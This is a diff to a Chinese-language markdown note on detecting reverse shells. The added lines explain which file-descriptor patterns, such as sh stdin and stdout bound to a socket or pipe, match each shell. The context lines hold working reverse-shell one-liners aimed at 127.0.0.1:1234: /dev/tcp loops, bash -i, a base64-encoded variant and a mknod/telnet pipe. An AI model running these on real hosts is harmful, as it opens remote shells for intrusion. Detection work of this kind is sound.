@@ -53,12 +53,24 @@ nc -u -lvp 1234
 ```
 ![agent](../images/WeChat9c018fc36b0256b4286d528e3e91651a.png)
 
+目标机执行后的结果如下：
+
+创建了sh进程，0和1描述符都指向了socket。
+
+匹配规则：sh的0，和1文件描述符指向socket
+
 ```bash
 exec 5<>/dev/tcp/127.0.0.1/1234; while read line 0<&5; do $line 2>&5 >&5; done
 
 ```
 
 ![agent](../images/WechatIMG56.jpeg)
+
+
+
+目标机执行后的结果如下：
+
+匹配规则：某一个bash进程的0 文件描述符指向socket
 
 ```bash
 nohup bash -c 'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'
@@ -74,6 +86,11 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYxJwo
 
 
 
+目标机执行后的结果如下：
+
+创建了sh进程，0和1描述符都指向了socket。
+
+匹配规则：sh的0，和1文件描述符指向socket
 
 
 
@@ -86,6 +103,11 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet 127.0.0.1 1
 ```
 ![agent](../images/WechatIMG59.jpeg)
 ![agent](../images/WechatIMG60.jpeg)
+
+目标机执行后的结果如下：
+
+创建了sh进程，0和1描述符都指向了pipe。
+匹配规则：sh进程的0，和1文件描述符指向pipe
 
 
 ```bash
